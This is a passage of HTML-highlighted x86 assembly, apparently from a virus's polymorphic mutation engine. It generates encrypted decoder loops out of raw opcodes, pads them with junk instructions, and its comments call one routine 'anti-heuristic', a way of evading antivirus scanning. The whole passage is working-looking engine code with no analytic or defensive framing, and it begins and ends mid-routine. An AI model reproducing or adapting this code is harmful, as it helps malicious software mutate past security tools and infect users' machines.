        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00F6h</span><span class="sc0">        </span><span class="sc1">;TEST byte [mlayer_reg],80h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mlayer_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">;test last byte</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">

        </span><span class="sc1">; build JNZ conditional jump (jump if DOWN)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">        </span><span class="sc1">;JNZ instruction</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;do place</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">;INC index register</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;JNZ offset</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;build JNZ offset</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; decrease number of movements in layer buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08FEh</span><span class="sc0">        </span><span class="sc1">;DEC byte ptr [---]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mlayer_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; test whether it was last coding, if yes, next movement</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00F6h</span><span class="sc0">        </span><span class="sc1">;TEST byte [mlayer_reg],7Fh</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mlayer_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">          </span><span class="sc1">;test "x0000000b" status</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">

        </span><span class="sc1">; build next conditional JNZ jump</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">        </span><span class="sc1">;JNZ instruction</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; generate a lot of TEST instructions and JNZ/JZ cond. jumps</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00F6h</span><span class="sc0">        </span><span class="sc1">;TEST byte [mlayer_reg],80h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mlayer_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">        </span><span class="sc1">;JNZ instruction</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;update later</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40F6h</span><span class="sc0">        </span><span class="sc1">;TEST byte [mlayer_reg+1],80h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mlayer_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8001h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">840Fh</span><span class="sc0">        </span><span class="sc1">;JZ instruction</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">          </span><span class="sc1">;DEC instruction</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">         </span><span class="sc1">;JMP instruction</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000008h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;@@3 update address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40F6h</span><span class="sc0">        </span><span class="sc1">;TEST byte [mlayer_reg+1],80h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mlayer_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8001h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">        </span><span class="sc1">;JNZ instruction</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000008h</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">;INC instruction</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">
    </span><span class="sc5">__pd_update_cjumps</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;get @@4 conditional jump</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__pd_update_cjumps</span><span class="sc0">

        </span><span class="sc1">; restore all registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate next code value ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function updates code value by code_value_add.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">ppe_get_next_code</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; calculate next code value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">       </span><span class="sc1">;ADD code_reg,code_value_add</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_value_add</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; restore all registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">       </span><span class="sc1">;update EDI through POPA</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to check multi-layers gaps ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function checks whether pointer is in gap (anti-heu-</span><span class="sc0">
        </span><span class="sc1">;stistic). If it's on that place then i'll change pointer.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__pgnlp_old</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;old random numbers</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_get_next_layer_pointer</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; increase multi-layer pointer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">;INC instruction</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mlayer_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; generate some random numbers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_num</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;number of gaps</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;no gaps ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__pgnlp_finish</span><span class="sc0">
    </span><span class="sc5">__pgnlp_get_nums</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;empty reg to BL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pgnlp_old</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">       </span><span class="sc1">;ADD instruction</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pgnlp_old</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">;save pos.</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">;ADD instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C03Bh</span><span class="sc0">       </span><span class="sc1">;CMP instruction</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">;empty reg &lt;&lt; 3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mlayer_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">        </span><span class="sc1">;JNZ conditional jump</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">       </span><span class="sc1">;ADD instruction</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mlayer_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_num</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;number of gaps</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pglg_where</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;calculate JNZ offset</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__pgnlp_get_nums</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

    </span><span class="sc5">__pgnlp_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to generate decoder-loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function generates last JNZ jump to the start of de-</span><span class="sc0">
        </span><span class="sc1">;coder loop.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__pge_where</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;place to update</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_get_exloop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; build main compare instruction</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_size</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;size of the layers buf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">           </span><span class="sc1">;dest reg</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">;ADD</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">       </span><span class="sc1">;ADD</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pge_where</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mlayer_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">          </span><span class="sc1">;CMP instruction</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
